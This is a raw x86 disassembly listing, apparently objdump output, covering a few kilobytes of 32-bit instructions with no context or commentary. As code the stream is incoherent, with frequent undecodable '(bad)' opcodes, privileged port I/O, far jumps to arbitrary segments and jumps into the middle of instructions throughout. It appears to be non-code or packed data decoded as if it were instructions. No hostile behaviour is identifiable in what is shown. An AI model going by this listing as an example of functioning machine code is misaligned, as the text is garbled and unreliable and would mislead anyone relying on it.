  41a557:	mov    ds:0x7b45a869,al
  41a55c:	mov    bl,BYTE PTR [esi+0x73e62387]
  41a562:	mov    al,0x0
  41a564:	jae    0x41a5c7
  41a566:	mov    ch,0x25
  41a568:	repnz cmp bl,BYTE PTR [edi+0x4]
  41a56c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a56d:	sbb    al,0x35
  41a56f:	pop    edx
  41a570:	fist   WORD PTR [eax-0x29]
  41a573:	sti    
  41a574:	ret    0xcd29
  41a577:	cmp    BYTE PTR [ebp+0x1918879c],0x20
  41a57e:	xchg   ebx,eax
  41a57f:	or     ecx,DWORD PTR [edx+0x14]
  41a582:	je     0x41a5af
  41a584:	repz bound esp,QWORD PTR [eax+0x3a]
  41a588:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a589:	cwde   
  41a58a:	xchg   ebp,eax
  41a58b:	dec    esi
  41a58c:	fwait
  41a58d:	mov    dh,0x28
  41a58f:	dec    eax
  41a590:	pop    ds
  41a591:	scas   eax,DWORD PTR es:[edi]
  41a592:	sub    BYTE PTR [esi-0x2c05ae42],dl
  41a598:	test   al,0xdc
  41a59a:	sbb    DWORD PTR [ebp-0xa5e2964],ebp
  41a5a0:	fucomip st,st(2)
  41a5a2:	mov    al,ds:0xf6901f14
  41a5a7:	mov    BYTE PTR [ebx+0x1aaa5d8a],ch
  41a5ad:	ins    BYTE PTR es:[edi],dx
  41a5ae:	add    eax,0x3ac21bc8
  41a5b3:	pop    esi
  41a5b4:	(bad)  [esi+0x9]
  41a5b7:	push   ds
  41a5b8:	xchg   DWORD PTR [ebp+0x7039beba],edi
  41a5be:	jnp    0x41a5c5
  41a5c0:	and    dh,bh
  41a5c2:	add    DWORD PTR [ecx],esi
  41a5c4:	and    BYTE PTR [esi+0x1a],dl
  41a5c7:	sbb    bl,BYTE PTR [esi+0x513214a4]
  41a5cd:	into   
  41a5ce:	sub    ah,BYTE PTR [ebx+0x611d2ecd]
  41a5d4:	nop
  41a5d5:	cmp    BYTE PTR [ebp-0x22c1eca5],0xdd
  41a5dc:	push   edi
  41a5dd:	das    
  41a5de:	in     eax,dx
  41a5df:	push   eax
  41a5e0:	lods   eax,DWORD PTR ds:[esi]
  41a5e1:	or     ebx,esi
  41a5e3:	std    
  41a5e4:	call   0x7f816851
  41a5e9:	mov    ch,0xe2
  41a5eb:	push   eax
  41a5ec:	popf   
  41a5ed:	(bad)  
  41a5ee:	out    0xc3,al
  41a5f0:	jne    0x41a576
  41a5f2:	ss pushf 
  41a5f4:	out    0xed,al
  41a5f6:	test   eax,0x8852f195
  41a5fb:	fsub   st,st(3)
  41a5fd:	or     DWORD PTR [esi+0x58],edx
  41a600:	popf   
  41a601:	loope  0x41a614
  41a603:	sbb    bl,cl
  41a605:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a606:	ins    BYTE PTR es:[edi],dx
  41a607:	xchg   BYTE PTR [ebx-0x79],dl
  41a60a:	daa    
  41a60b:	fcom   DWORD PTR [esi+ecx*1+0x2cb0d14]
  41a612:	mov    eax,ds:0x4fbc88d0
  41a617:	mov    ds:0x4a9fe11e,al
  41a61c:	push   ebx
  41a61d:	test   DWORD PTR [eax+0x2c],ebx
  41a620:	leave  
  41a621:	jmp    0x41a691
  41a623:	clc    
  41a624:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a625:	cld    
  41a626:	fstp   QWORD PTR [ebx-0x5c]
  41a629:	xor    al,0xd5
  41a62b:	mov    es,WORD PTR [ebx]
  41a62d:	out    dx,al
  41a62e:	pop    es
  41a62f:	dec    ebp
  41a630:	mov    ds:0x3f13a2a8,al
  41a635:	jb     0x41a69e
  41a637:	jno    0x41a6b2
  41a639:	or     ecx,DWORD PTR [edx-0x1704f862]
  41a63f:	lahf   
  41a640:	xchg   DWORD PTR [ecx+0x3e128783],eax
  41a646:	call   0x657a9ab
  41a64b:	cmp    DWORD PTR [eax+ecx*1-0xed7225],edx
  41a652:	sub    bh,dh
  41a654:	mov    ch,0x41
  41a656:	popf   
  41a657:	dec    edx
  41a658:	mov    ebx,0x35f7aa02
  41a65d:	cwde   
  41a65e:	shl    BYTE PTR [esi+0x55],cl
  41a661:	push   esi
  41a662:	pusha  
  41a663:	push   esp
  41a664:	sbb    esp,DWORD PTR [ebp-0x50]
  41a667:	push   edx
  41a668:	imul   ebx,DWORD PTR [edx-0x2383100e],0xffffffbc
  41a66f:	stos   DWORD PTR es:[edi],eax
  41a670:	fcmovbe st,st(1)
  41a672:	cmp    dh,BYTE PTR [edi-0x52565f6a]
  41a678:	pop    ss
  41a679:	jo     0x41a64d
  41a67b:	mov    edx,0xa94f5a31
  41a680:	stos   BYTE PTR es:[edi],al
  41a681:	and    al,0x8
  41a683:	popf   
  41a684:	push   ebx
  41a685:	mov    eax,ds:0x7418a81
  41a68a:	fdivr  QWORD PTR [edi-0x7f79df4c]
  41a690:	pop    edx
  41a691:	push   edi
  41a692:	mov    WORD PTR fs:[edi-0x30],ds
  41a696:	test   eax,0x255390e5
  41a69b:	ret    0xc28a
  41a69e:	fild   DWORD PTR [eax+0x71]
  41a6a1:	push   esp
  41a6a2:	xchg   DWORD PTR ds:[ecx],esp
  41a6a5:	retf   0x1cd7
  41a6a8:	not    cl
  41a6aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a6ab:	mov    edi,DWORD PTR [ecx+ecx*2+0x25]
  41a6af:	xchg   edx,eax
  41a6b0:	pop    ebx
  41a6b1:	xor    BYTE PTR [edx],bh
  41a6b3:	dec    ebp
  41a6b4:	or     dl,ch
  41a6b6:	mov    esi,0x8cf9b234
  41a6bb:	pusha  
  41a6bc:	push   ebx
  41a6bd:	and    eax,DWORD PTR [ebx]
  41a6bf:	aaa    
  41a6c0:	jb     0x41a6ec
  41a6c2:	cmp    eax,0x78e3ebde
  41a6c7:	cmp    eax,0xccc03c02
  41a6cc:	pop    eax
  41a6cd:	aad    0x63
  41a6cf:	mov    al,ds:0x78cc4538
  41a6d4:	dec    eax
  41a6d5:	aad    0x6b
  41a6d7:	cmp    BYTE PTR [esi-0x2],cl
  41a6da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a6db:	mov    al,0x45
  41a6dd:	jbe    0x41a6e7
  41a6df:	xor    ch,al
  41a6e1:	test   eax,0xa3567213
  41a6e6:	das    
  41a6e7:	dec    esp
  41a6e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a6e9:	rol    BYTE PTR [esi+eiz*1-0x3b],cl
  41a6ed:	rcl    BYTE PTR [edx+0x3],0x25
  41a6f1:	into   
  41a6f2:	sar    BYTE PTR [edx],0x85
  41a6f5:	(bad)  
  41a6f6:	stc    
  41a6f7:	xchg   esp,eax
  41a6f8:	js     0x41a76b
  41a6fa:	repnz aad 0x2e
  41a6fd:	das    
  41a6fe:	push   ebx
  41a6ff:	mov    cl,0x83
  41a701:	pop    edx
  41a702:	mov    bh,BYTE PTR [ebx-0xa1e4068]
  41a708:	mov    ds:0x1b82fbdd,al
  41a70d:	pushf  
  41a70e:	xchg   BYTE PTR [edx],cl
  41a710:	lahf   
  41a711:	pop    eax
  41a712:	retf   
  41a713:	jle    0x41a728
  41a715:	stc    
  41a716:	psrld  mm7,QWORD PTR [edi-0x53]
  41a71a:	cmp    ebp,0x4473fdd4
  41a720:	aad    0xbc
  41a722:	adc    al,0x7d
  41a724:	into   
  41a725:	jecxz  0x41a746
  41a727:	cmp    DWORD PTR [esi-0x17],ebp
  41a72a:	test   DWORD PTR [eax+0x41841c3b],0xaa2f83eb
  41a734:	cmp    al,0xdd
  41a736:	sbb    BYTE PTR [ecx+ebx*8+0x61],ch
  41a73a:	push   ebp
  41a73b:	out    dx,al
  41a73c:	cmc    
  41a73d:	scas   al,BYTE PTR es:[edi]
  41a73e:	mov    ds:0xb57dc6ec,eax
  41a743:	data16 into 
  41a745:	push   0x66dce67b
  41a74a:	adc    eax,0xd657d0fd
  41a74f:	jnp    0x41a7c6
  41a751:	mov    eax,0xbc8cd0f3
  41a756:	jg     0x41a73d
  41a758:	mov    WORD PTR [esi+0x1bef5a0d],gs
  41a75e:	call   0x8a26:0xc9d963de
  41a765:	lea    esi,[eax]
  41a767:	jge    0x41a7aa
  41a769:	imul   ebp,DWORD PTR [ebx+eiz*4+0x5372485f],0xffffff90
  41a771:	(bad)  
  41a772:	repz mov ebp,0xa8e7dccb
  41a778:	push   ebx
  41a779:	cmp    esp,edi
  41a77b:	cmp    ebx,ecx
  41a77d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a77e:	xor    al,0xfc
  41a780:	lods   eax,DWORD PTR ds:[esi]
  41a781:	sub    BYTE PTR [edx],ah
  41a783:	ss mov edx,0xe10c3f13
  41a789:	jb     0x41a79a
  41a78b:	popf   
  41a78c:	aas    
  41a78d:	dec    edx
  41a78e:	push   esi
  41a78f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a790:	cld    
  41a791:	ss mov edx,0x3b902e28
  41a797:	sbb    ebp,DWORD PTR [edi+0x3d78954f]
  41a79d:	xor    DWORD PTR [edi-0xa],0x1080832d
  41a7a4:	arpl   WORD PTR [eax+ebx*1],bp
  41a7a7:	ror    BYTE PTR [esi],1
  41a7a9:	bound  ecx,QWORD PTR [edi-0x1e47c04d]
  41a7af:	jge    0x41a769
  41a7b1:	push   es
  41a7b2:	fld    TBYTE PTR [ecx]
  41a7b4:	jp     0x41a7ca
  41a7b6:	mov    dl,0xd3
  41a7b8:	in     eax,dx
  41a7b9:	scas   al,BYTE PTR es:[edi]
  41a7ba:	or     eax,DWORD PTR ds:0xe751bfa5
  41a7c0:	pop    ecx
  41a7c1:	sbb    ecx,edx
  41a7c3:	fisttp QWORD PTR [ebp+eax*8+0x2a]
  41a7c7:	xor    al,0xb9
  41a7c9:	repnz (bad) 
  41a7cb:	(bad)  
  41a7cc:	out    0xa8,eax
  41a7ce:	jnp    0x41a7db
  41a7d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a7d1:	(bad)  
  41a7d2:	xlat   BYTE PTR ds:[ebx]
  41a7d3:	jl     0x41a7e0
  41a7d5:	mov    ds:0xae9d70ca,eax
  41a7da:	push   esi
  41a7db:	or     ch,BYTE PTR [ebp-0x39]
  41a7de:	pop    eax
  41a7df:	jmp    0x32e1:0x43e4a3c2
  41a7e6:	or     al,ah
  41a7e8:	mov    al,BYTE PTR [eax]
  41a7ea:	add    bh,ch
  41a7ec:	add    BYTE PTR [edi+0x20],0xc2
  41a7f0:	fild   DWORD PTR [eax-0x18]
  41a7f3:	ss mov dh,0x76
  41a7f6:	mov    al,0x36
  41a7f8:	repz add al,0x70
  41a7fb:	in     al,0xdf
  41a7fd:	mov    cs,WORD PTR [edx-0x63]
  41a800:	test   eax,0x39e524a0
  41a805:	lods   al,BYTE PTR ds:[esi]
  41a806:	ins    BYTE PTR es:[edi],dx
  41a807:	(bad)  
  41a808:	jne    0x41a7e0
  41a80a:	movups xmm6,XMMWORD PTR [esi+0xf116c4]
  41a811:	or     al,0x57
  41a813:	mov    eax,ds:0xfb99f52b
  41a818:	mov    edx,0xf3cfeb62
  41a81d:	fstp   st(4)
  41a81f:	into   
  41a820:	in     al,0x8b
  41a822:	or     DWORD PTR [ecx-0x49],esi
  41a825:	add    DWORD PTR [ecx],eax
  41a827:	in     eax,dx
  41a828:	sub    BYTE PTR ds:0x24a2bb94,0xa4
  41a82f:	sti    
  41a830:	retf   
  41a831:	rol    bl,1
  41a833:	push   esi
  41a834:	lods   al,BYTE PTR ds:[esi]
  41a835:	nop
  41a836:	adc    eax,0x6fd34c31
  41a83b:	add    eax,0x4c132629
  41a840:	bt     edi,ebp
  41a843:	fld    st(5)
  41a845:	sub    eax,0x391cd9ff
  41a84a:	dec    edi
  41a84b:	jae    0x41a8b8
  41a84d:	jo     0x41a7f4
  41a84f:	inc    esi
  41a850:	mov    al,ds:0x2e49682b
  41a855:	dec    eax
  41a856:	fs inc edi
  41a858:	jno    0x41a8d3
  41a85a:	dec    edx
  41a85b:	inc    ebp
  41a85c:	out    dx,al
  41a85d:	xchg   BYTE PTR [esi+0x7c983a83],cl
  41a863:	in     eax,0x79
  41a865:	es push es
  41a867:	inc    edx
  41a868:	sar    DWORD PTR [ebp+0x7aa2add2],0x6c
  41a86f:	jo     0x41a82f
  41a871:	or     al,0x89
  41a873:	aam    0x82
  41a875:	dec    ecx
  41a876:	push   esp
  41a877:	pop    esi
  41a878:	xchg   ecx,eax
  41a879:	fcmovu st,st(0)
  41a87b:	int3   
  41a87c:	sub    al,0xb1
  41a87e:	in     al,0x62
  41a880:	push   eax
  41a881:	adc    eax,0xe4189987
  41a886:	mov    BYTE PTR [ecx],dh
  41a888:	adc    ch,dl
  41a88a:	call   0xd6d5:0x50af383f
  41a891:	in     eax,dx
  41a892:	and    DWORD PTR [ebp+0x8bf849e],edx
  41a898:	jno    0x41a85b
  41a89a:	jmp    0x41a907
  41a89c:	mov    BYTE PTR ds:0xc634dbb2,dh
  41a8a2:	ds (bad) 
  41a8a4:	out    0xea,al
  41a8a6:	clc    
  41a8a7:	fwait
  41a8a8:	loop   0x41a91e
  41a8aa:	dec    ebp
  41a8ab:	xor    ch,BYTE PTR [edx]
  41a8ad:	leave  
  41a8ae:	loope  0x41a8da
  41a8b0:	mov    edx,0x15a3c268
  41a8b5:	in     eax,0xe4
  41a8b7:	mov    edx,0x7bab4fb1
  41a8bc:	sub    DWORD PTR [ebp-0x120b1274],edi
  41a8c2:	fisttp QWORD PTR ds:0x8433293d
  41a8c8:	dec    esp
  41a8c9:	rcr    bl,0xc3
  41a8cc:	xor    eax,0xd31a9e0b
  41a8d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a8d2:	outs   dx,DWORD PTR fs:[esi]
  41a8d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a8d5:	aas    
  41a8d6:	or     al,0xba
  41a8d8:	out    dx,eax
  41a8d9:	inc    edx
  41a8da:	jne    0x41a937
  41a8dc:	jae    0x41a8e7
  41a8de:	and    eax,0xe77906d1
  41a8e3:	xor    DWORD PTR [esi+0x50],ebx
  41a8e6:	pop    es
  41a8e7:	mov    bh,0x88
  41a8e9:	add    ax,0xb66f
  41a8ed:	sub    eax,0x47318e01
  41a8f2:	(bad)  
  41a8f4:	popa   
  41a8f5:	das    
  41a8f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a8f7:	pop    ebx
  41a8f8:	in     al,dx
  41a8f9:	rcl    ch,cl
  41a8fb:	ja     0x41a8db
  41a8fd:	jmp    0xc575e273
  41a902:	mov    fs,WORD PTR [esi+0x33b762f0]
  41a908:	gs mov bh,0x84
  41a90b:	mov    ecx,0xbb1961cc
  41a910:	rcl    BYTE PTR [esi+0x7b],cl
  41a913:	and    eax,0xd0e3611f
  41a918:	xchg   esp,eax
  41a919:	dec    eax
  41a91a:	and    eax,0x5029e07c
  41a91f:	mul    DWORD PTR ds:0x80a68738
  41a925:	data16 sahf 
  41a927:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a928:	outs   dx,DWORD PTR ds:[esi]
  41a929:	lahf   
  41a92a:	stos   DWORD PTR es:[edi],eax
  41a92b:	and    ah,BYTE PTR [ecx]
  41a92d:	xchg   esp,eax
  41a92e:	push   eax
  41a92f:	xchg   esp,eax
  41a930:	fsubr  st(4),st
  41a932:	add    al,0x26
  41a934:	ret    
  41a935:	ret    
  41a936:	or     esi,DWORD PTR [ebx]
  41a938:	das    
  41a939:	jmp    0x41a988
  41a93b:	shr    DWORD PTR [edi],cl
  41a93d:	mov    edi,0xa930c014
  41a942:	pop    esp
  41a943:	test   BYTE PTR [ebp-0xb5ef8eb],al
  41a949:	cmp    ch,dh
  41a94b:	dec    eax
  41a94c:	sahf   
  41a94d:	dec    esi
  41a94e:	test   al,0x9c
  41a950:	fwait
  41a951:	jbe    0x41a93a
  41a953:	xor    eax,0xcca0d4f7
  41a958:	pop    esi
  41a959:	pop    eax
  41a95a:	inc    edx
  41a95b:	inc    ebx
  41a95c:	lock xchg esp,eax
  41a95e:	and    cl,BYTE PTR [ecx-0x1d1d3d94]
  41a964:	pop    esi
  41a965:	(bad)  
  41a966:	adc    al,0xac
  41a968:	retf   
  41a969:	lods   eax,DWORD PTR ds:[esi]
  41a96a:	or     BYTE PTR [edx],dh
  41a96c:	lahf   
  41a96d:	mov    edi,0x21f8160
  41a972:	gs push esp
  41a974:	loopne 0x41a8fe
  41a976:	fadd   QWORD PTR [ebx-0x29]
  41a979:	cdq    
  41a97a:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  41a97c:	xor    BYTE PTR [ecx+0x14e6acf4],ch
  41a982:	push   ebx
  41a983:	pop    edi
  41a984:	jne    0x41a9b9
  41a986:	loop   0x41a990
  41a988:	pop    es
  41a989:	xchg   ebx,eax
  41a98a:	sub    bh,BYTE PTR [esi+0x2d]
  41a98d:	mov    ecx,0xdd1450f6
  41a992:	mov    dl,0x34
  41a994:	adc    DWORD PTR [ebp+0x5c9ce66e],ebp
  41a99a:	lea    edi,[edx-0x4247d522]
  41a9a0:	or     BYTE PTR [ecx+edi*4-0x2d],bh
  41a9a4:	data16 mov dl,0x22
  41a9a7:	mov    DWORD PTR [ecx+ebx*2],ebx
  41a9aa:	outs   dx,BYTE PTR ds:[esi]
  41a9ab:	(bad)  
  41a9ac:	scas   eax,DWORD PTR es:[edi]
  41a9ad:	fld    QWORD PTR [ebx*4-0x63ed9a7a]
  41a9b4:	stos   BYTE PTR es:[edi],al
  41a9b5:	add    BYTE PTR [esi-0x43a99f82],bl
  41a9bb:	sahf   
  41a9bc:	ss pop ebp
  41a9be:	cmp    ch,dh
  41a9c0:	xlat   BYTE PTR ds:[ebx]
  41a9c1:	mov    dl,0xb
  41a9c3:	pop    eax
  41a9c4:	int    0xb6
  41a9c6:	stos   BYTE PTR es:[edi],al
  41a9c7:	jo     0x41a96b
  41a9c9:	lock mov al,0xbe
  41a9cc:	sub    dh,BYTE PTR [ebp+0x78]
  41a9cf:	ret    
  41a9d0:	sub    BYTE PTR [ebx],ah
  41a9d2:	nop
  41a9d3:	cs push 0x2e
  41a9d6:	push   ss
  41a9d7:	test   DWORD PTR [edi+0x15],0xa6941b54
  41a9de:	loope  0x41a9fa
  41a9e0:	push   esi
  41a9e1:	mov    ds:0x7d48833c,eax
  41a9e6:	data16 int3 
  41a9e8:	cwde   
  41a9e9:	xchg   edx,eax
  41a9ea:	mov    ds:0x5f20ce11,ax
  41a9f0:	dec    esi
  41a9f1:	sub    dl,cl
  41a9f3:	add    al,0xf8
  41a9f5:	loope  0x41aa2e
  41a9f7:	(bad)  
  41a9f9:	js     0x41aa4b
  41a9fb:	gs and al,0x94
  41a9fe:	mov    ch,0xd
  41aa00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aa01:	sti    
  41aa02:	mov    bl,0x4d
  41aa04:	(bad)  
  41aa05:	xlat   BYTE PTR ds:[ebx]
  41aa06:	into   
  41aa07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aa08:	cmp    eax,0xa7824638
  41aa0d:	push   ecx
  41aa0e:	ret    0x32c7
  41aa11:	jg     0x41aa27
  41aa13:	add    eax,0x99e7e3dc
  41aa18:	adc    eax,0x96bf559b
  41aa1d:	push   0x8dafebb
  41aa22:	mov    ds:0xdd3bedf6,eax
  41aa27:	(bad)  
  41aa28:	push   ecx
  41aa29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aa2a:	loopne 0x41aa47
  41aa2c:	inc    edx
  41aa2d:	xchg   esp,eax
  41aa2e:	xchg   DWORD PTR [edx+0x29],ebp
  41aa31:	mov    cl,ch
  41aa33:	lahf   
  41aa34:	sbb    ecx,esi
  41aa36:	jge    0x41a9bb
  41aa38:	push   0x45
  41aa3a:	stos   DWORD PTR es:[edi],eax
  41aa3b:	neg    DWORD PTR [edx+0x3a]
  41aa3e:	sub    BYTE PTR [ecx+0x4],dh
  41aa41:	or     eax,DWORD PTR [esi+edx*8]
  41aa44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aa45:	enter  0x7ef1,0x7d
  41aa49:	frstor [edi]
  41aa4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aa4c:	sbb    al,0x17
  41aa4e:	or     eax,0xfc93f73f
  41aa53:	mov    dl,dh
  41aa55:	mov    eax,ds:0x17d0179f
  41aa5a:	sub    al,0xb0
  41aa5c:	faddp  st(7),st
  41aa5e:	and    eax,0xde2d4eb
  41aa63:	dec    edx
  41aa64:	cli    
  41aa65:	gs aas 
  41aa67:	dec    esp
  41aa68:	inc    eax
  41aa69:	adc    eax,0x2090aff2
  41aa6e:	sbb    dh,dl
  41aa70:	js     0x41aa60
  41aa72:	sub    al,0x89
  41aa74:	sub    al,0x37
  41aa76:	jmp    0x285cdeda
  41aa7b:	repnz sub eax,0x85158e97
  41aa81:	(bad)  
  41aa82:	jmp    0x6a57:0x6c269ee0
  41aa89:	out    0xf7,eax
  41aa8b:	mov    edx,0x18b483bc
  41aa90:	pop    ecx
  41aa91:	int3   
  41aa92:	in     eax,dx
  41aa93:	mov    ecx,?
  41aa95:	pushf  
  41aa96:	pop    es
  41aa97:	lods   al,BYTE PTR ds:[esi]
  41aa98:	or     eax,0xeb2fd6aa
  41aa9d:	push   0xffffffa1
  41aa9f:	or     eax,0x7978c1fd
  41aaa4:	xchg   ebx,eax
  41aaa5:	mov    edx,0xa7083d35
  41aaaa:	jne    0x41ab1d
  41aaac:	mov    esi,0xa66ef179
  41aab1:	or     al,0xb4
  41aab3:	or     bl,bl
  41aab5:	mov    ebx,0xdf8118c3
  41aaba:	lock not BYTE PTR [edi+eiz*8-0x2a]
  41aabf:	add    BYTE PTR [eax+0x16766343],dl
  41aac5:	ror    BYTE PTR [eax-0x42],cl
  41aac8:	loope  0x41aa86
  41aaca:	fwait
  41aacb:	dec    ebx
  41aacc:	inc    edi
  41aacd:	or     edi,DWORD PTR [ecx]
  41aacf:	icebp  
  41aad0:	pop    ecx
  41aad1:	ins    DWORD PTR es:[edi],dx
  41aad2:	inc    edi
  41aad3:	ds adc cl,al
  41aad6:	loop   0x41aaa8
  41aad8:	dec    ebp
  41aad9:	pushf  
  41aada:	dec    edx
  41aadb:	cmc    
  41aadc:	in     eax,0x32
  41aade:	adc    DWORD PTR [eax-0x334d17f2],ecx
  41aae4:	cmp    bh,BYTE PTR [esi-0x74]
  41aae7:	sbb    BYTE PTR ds:0xb43b5f68,0x5b
  41aaee:	push   esi
  41aaef:	and    DWORD PTR [eax],0xffffffef
  41aaf2:	xlat   BYTE PTR ds:[ebx]
  41aaf3:	ret    
  41aaf4:	cs xchg esi,eax
  41aaf6:	(bad)  
  41aaf7:	mov    eax,0xa4f0877d
  41aafc:	and    DWORD PTR [ebp+0x6b],ebp
  41aaff:	(bad)  
  41ab00:	in     al,0x42
  41ab02:	xor    eax,0x67fc94d8
  41ab07:	mov    ebp,0xd50d3f7
  41ab0c:	fmulp  st(6),st
  41ab0e:	aad    0xae
  41ab10:	mov    ds:0x7f12fe83,eax
  41ab15:	(bad)  
  41ab16:	mov    al,0x71
  41ab18:	jb     0x41ab20
  41ab1a:	cmp    ah,BYTE PTR [edi+0x39]
  41ab1d:	sub    al,0x46
  41ab1f:	pop    ecx
  41ab20:	push   0x2d
  41ab22:	cmp    ebp,eax
  41ab24:	inc    ebx
  41ab25:	popa   
  41ab26:	retf   0xb152
  41ab29:	inc    ebx
  41ab2a:	jecxz  0x41aabf
  41ab2c:	sar    DWORD PTR [edx+0x28],1
  41ab2f:	jg     0x41ab80
  41ab31:	inc    ebp
  41ab32:	pop    ecx
  41ab33:	jecxz  0x41ab08
  41ab35:	cmp    BYTE PTR [edi-0xe508f1c],dh
  41ab3b:	inc    edx
  41ab3c:	cmp    al,0x1b
  41ab3e:	xor    al,0x38
  41ab40:	test   DWORD PTR [edi+esi*2-0x1d],esi
  41ab44:	outs   dx,DWORD PTR ds:[esi]
  41ab45:	ror    BYTE PTR ds:0xb886f2b9,cl
  41ab4b:	xchg   DWORD PTR [ebp+0x64b37a32],edi
  41ab51:	lea    edx,[eax+0x71]
  41ab54:	jge    0x41ab17
  41ab56:	je     0x41aba7
  41ab58:	or     eax,0xa9bdc32d
  41ab5d:	pop    edi
  41ab5e:	ins    DWORD PTR es:[edi],dx
  41ab5f:	xchg   DWORD PTR [ebp-0x27f295b1],edx
  41ab65:	sub    DWORD PTR [edx+eax*8-0x77b912a6],ecx
  41ab6c:	enter  0xfc49,0xa2
  41ab70:	push   cs
  41ab71:	popa   
  41ab72:	jmp    0x7519:0x94972110
  41ab79:	(bad)  
  41ab7a:	nop
  41ab7b:	loop   0x41abb2
  41ab7d:	mov    DWORD PTR [edx],edi
  41ab7f:	es mov esi,0x92a1b065
  41ab85:	pop    ebx
  41ab86:	sbb    BYTE PTR fs:[edi],bl
  41ab89:	inc    ebp
  41ab8a:	shr    BYTE PTR [ecx],0xad
  41ab8d:	lock cmp bl,BYTE PTR [eax-0x44]
  41ab91:	jb     0x41ab72
  41ab93:	mov    ecx,0xe57a54e2
  41ab98:	aas    
  41ab99:	xlat   BYTE PTR ds:[ebx]
  41ab9a:	and    al,0xc1
  41ab9c:	jb     0x41ab6c
  41ab9e:	dec    ebx
  41ab9f:	psadbw mm0,QWORD PTR [edi-0x6d54fae5]
  41aba6:	jnp    0x41ab45
  41aba8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aba9:	jbe    0x41ab5d
  41abab:	pop    edi
  41abac:	lods   eax,DWORD PTR ds:[esi]
  41abad:	out    0x16,al
  41abaf:	xchg   BYTE PTR [ebx],bh
  41abb1:	mov    WORD PTR [edi-0x6f],ss
  41abb4:	jae    0x41ab5c
  41abb6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41abb7:	jo     0x41ac1f
  41abb9:	retf   
  41abba:	inc    ebx
  41abbb:	aad    0x81
  41abbd:	loope  0x41abf6
  41abbf:	mov    ds:0xf0eba722,al
  41abc4:	icebp  
  41abc5:	in     al,dx
  41abc6:	jmp    0x3deb:0xcbff124
  41abcd:	mov    dh,0x28
  41abcf:	sub    DWORD PTR [edi+0x673d8662],esp
  41abd5:	push   edx
  41abd6:	iret   
  41abd7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41abd8:	dec    esp
  41abd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41abda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41abdb:	mov    ch,0xa
  41abdd:	or     BYTE PTR [eax+eiz*1-0x66],bl
  41abe1:	sahf   
  41abe2:	(bad)  
  41abe3:	push   0x397233f9
  41abe8:	cwde   
  41abe9:	in     al,0xd
  41abeb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41abec:	aaa    
  41abed:	sar    DWORD PTR [ebp-0x5fe8d45b],0xef
  41abf4:	lods   al,BYTE PTR ds:[esi]
  41abf5:	rcl    BYTE PTR [ecx-0x7d],0x59
  41abf9:	test   BYTE PTR [edi-0x1176ca7c],0x11
  41ac00:	inc    edi
  41ac01:	out    dx,eax
  41ac02:	retf   
  41ac03:	popf   
  41ac04:	xchg   ebx,eax
  41ac05:	push   ds
  41ac06:	and    al,0xcc
  41ac08:	aad    0xb1
  41ac0a:	out    0x8d,eax
  41ac0c:	pusha  
  41ac0d:	and    dl,bl
  41ac0f:	mov    cl,0x72
  41ac11:	cmp    BYTE PTR [edi+0x296c6688],0xe4
  41ac18:	scas   eax,DWORD PTR es:[edi]
  41ac19:	das    
  41ac1a:	addr16 add eax,0x275c67c6
  41ac20:	cdq    
  41ac21:	or     edx,ebp
  41ac23:	push   edx
  41ac24:	loop   0x41abe3
  41ac26:	lock test al,0xb5
  41ac29:	jbe    0x41abd4
  41ac2b:	mov    dh,0x79
  41ac2d:	cwde   
  41ac2e:	inc    edx
  41ac2f:	sub    eax,0x5924731a
  41ac34:	xlat   BYTE PTR ds:[ebx]
  41ac35:	or     eax,0xa121dae0
  41ac3a:	sub    BYTE PTR ss:[ecx],dl
  41ac3d:	xor    ecx,DWORD PTR [ecx+edi*2]
  41ac40:	mov    al,0xef
  41ac42:	jmp    0x41abce
  41ac44:	jg     0x41ac4b
  41ac46:	std    
  41ac47:	mov    WORD PTR [esi-0x54],es
  41ac4a:	cld    
  41ac4b:	push   0x70
  41ac4d:	mov    dh,0x61
  41ac4f:	sub    al,0xe9
  41ac51:	xchg   esi,eax
  41ac52:	pop    edx
  41ac53:	retf   0xd293
  41ac56:	out    0x6b,al
  41ac58:	popa   
  41ac59:	xchg   esi,eax
  41ac5a:	push   ecx
  41ac5b:	jbe    0x41ac20
  41ac5d:	imul   esi,DWORD PTR [eax],0x47fbba86
  41ac63:	cmp    BYTE PTR [edx],ah
  41ac65:	mov    ecx,0x7a98fa5a
  41ac6a:	pop    ds
  41ac6b:	lods   eax,DWORD PTR ds:[esi]
  41ac6c:	or     DWORD PTR [edi],esp
  41ac6e:	test   DWORD PTR [eax-0x65],0xe631b560
  41ac75:	dec    esp
  41ac76:	out    0x3d,al
  41ac78:	pop    ebp
  41ac79:	les    eax,FWORD PTR [edi-0x36]
  41ac7c:	xchg   ebx,eax
  41ac7d:	adc    DWORD PTR [ecx],ecx
  41ac7f:	loop   0x41ac7a
  41ac81:	jnp    0x41aca5
  41ac83:	mov    bl,0x62
  41ac85:	fs (bad) 
  41ac87:	xor    ch,ch
  41ac89:	push   0x11e1e78d
